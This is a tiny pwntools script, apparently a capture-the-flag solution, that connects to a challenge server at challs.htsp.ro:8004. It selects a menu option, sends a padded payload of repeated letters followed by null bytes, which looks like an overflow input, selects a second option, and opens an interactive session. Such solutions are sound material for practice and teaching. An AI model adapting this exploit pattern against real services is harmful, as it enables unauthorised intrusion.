from pwn import *
r = remote("challs.htsp.ro", 8004)
r.sendline(b"1")
r.sendline(b"AAABBBCCCDDDEEEFFF\x00\x00\x00")
r.sendline(b"2")
r.interactive()
